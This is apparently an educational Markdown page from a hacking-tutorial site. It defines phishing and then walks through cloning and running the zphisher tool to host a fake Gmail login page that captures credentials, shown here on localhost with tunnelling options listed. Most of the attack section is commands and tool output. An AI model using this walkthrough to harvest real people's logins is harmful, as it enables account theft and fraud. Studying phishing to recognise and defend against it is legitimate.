---
title: Phishing
description: What is phishing, what do we use it for, and how can we use it. 
layout: ../../layouts/MainLayout.astro
---

This is a fully-featured page, written in Markdown!

## What is phishing 

Phishing is a sort of [social engineering](page-socialEngineering) in which an attacker sends a fake communication in order to fool a person into disclosing sensitive information to the attacker or to install harmful software, such as ransomware, on the victim's infrastructure.

## Which hacking category is phishing in

Phishing is in the category of [social enginerring](page-socialEngineering) in which the attacker tricks the human into making them do something, which they weren't supposed to do, or was aware that was bad that they were doing.

## Why do hackers use phishing

Hackers use phishing for example to get a users user-credentials of a website.

This can easily be illustrated using the tool [zphisher](https://github.com/htr-tech/zphisher)

## Downloading zphisher from github

Start by opening the terminal on kali linux

Go to the [zphisher](https://github.com/htr-tech/zphisher) github reposetory and clone the link or copy the command beneath

    git clone --depth=1 https://github.com/htr-tech/zphisher.git

**Result:**
```markdown
Cloning into 'zphisher'...
remote: Enumerating objects: 320, done.
remote: Counting objects: 100% (320/320), done.
remote: Compressing objects: 100% (303/303), done.
remote: Total 320 (delta 49), reused 224 (delta 13), pack-reused 0
Receiving objects: 100% (320/320), 12.10 MiB | 4.08 MiB/s, done.
Resolving deltas: 100% (49/49), done.
```

Next change directory to the zphisher directory by typing the following command into terminal

    cd zphisher

**Result:**
```markdown
Directory change into zphisher
```

Run the script you have installed by typing the following command in the terminal

    bash zphisher.sh

**Result:**
```markdown
[+] Installing required packages...

[+] Packages already installed.

[+] Installing ngrok...

[+] Installing Cloudflared...

[+] Installing LocalXpose...
```

```markdown
 ______      _     _     _
|___  /     | |   (_)   | |
   / / _ __ | |__  _ ___| |__   ___ _ __
  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
 / /__| |_) | | | | \__ \ | | |  __/ |
/_____| .__/|_| |_|_|___/_| |_|\___|_|
      | |
      |_|                Version : 2.3.1

[-] Tool Created by htr-tech (tahmid.rayat)

[::] Select An Attack For Your Victim [::]

[01] Facebook      [11] Twitch       [21] DeviantArt
[02] Instagram     [12] Pinterest    [22] Badoo
[03] Google        [13] Snapchat     [23] Origin
[04] Microsoft     [14] Linkedin     [24] DropBox
[05] Netflix       [15] Ebay         [25] Yahoo
[06] Paypal        [16] Quora        [26] Wordpress
[07] Steam         [17] Protonmail   [27] Yandex
[08] Twitter       [18] Spotify      [28] StackoverFlow
[09] Playstation   [19] Reddit       [29] Vk
[10] Tiktok        [20] Adobe        [30] XBOX
[31] Mediafire     [32] Gitlab       [33] Github
[34] Discord

[99] About         [00] Exit

[-] Select an option :
```

## Example of using zphisher

When looking at the screen as shown below 

```markdown
 ______      _     _     _
|___  /     | |   (_)   | |
   / / _ __ | |__  _ ___| |__   ___ _ __
  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
 / /__| |_) | | | | \__ \ | | |  __/ |
/_____| .__/|_| |_|_|___/_| |_|\___|_|
      | |
      |_|                Version : 2.3.1

[-] Tool Created by htr-tech (tahmid.rayat)

[::] Select An Attack For Your Victim [::]

[01] Facebook      [11] Twitch       [21] DeviantArt
[02] Instagram     [12] Pinterest    [22] Badoo
[03] Google        [13] Snapchat     [23] Origin
[04] Microsoft     [14] Linkedin     [24] DropBox
[05] Netflix       [15] Ebay         [25] Yahoo
[06] Paypal        [16] Quora        [26] Wordpress
[07] Steam         [17] Protonmail   [27] Yandex
[08] Twitter       [18] Spotify      [28] StackoverFlow
[09] Playstation   [19] Reddit       [29] Vk
[10] Tiktok        [20] Adobe        [30] XBOX
[31] Mediafire     [32] Gitlab       [33] Github
[34] Discord

[99] About         [00] Exit

[-] Select an option :
```

You are able to choose a platform of which you want to create a fake phishing link to use on your target

Let's say that we press '3', which means "use google", then we will be asked if we want to use the old login page
a new one or an advanced voting poll 

In this example we will use "[02] Gmail New Login Page" by pressing 2

```markdown
[01] Gmail Old Login Page
[02] Gmail New Login Page
[03] Advanced Voting Poll

[-] Select an option : 2
```

After you have selected which option you would like to use, we are again greeted with which kind of service we want to use to make our link.

In this example we will use [localhost](page-localhost) for demonstration purposes 

```markdown
[01] Localhost
[02] Ngrok.io     [Account Needed]
[03] Cloudflared  [Auto Detects]
[04] LocalXpose   [NEW! Max 15Min]

[-] Select a port forwarding service : 1

[-] Initializing... ( http://127.0.0.1:8080 )

[-] Setting up server...

[-] Starting PHP server...
```

**This link can not be used by other than you and should return**

```markdown
  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ 2.3.1

[-] Successfully Hosted at : http://127.0.0.1:8080

[-] Waiting for Login Info, Ctrl + C to exit...

```

## What is bash and why do we use that to run the file

The file in matter is a .sh file, which means it's using the scripting language bash, this is the reason why
it's run with the bash comamnd

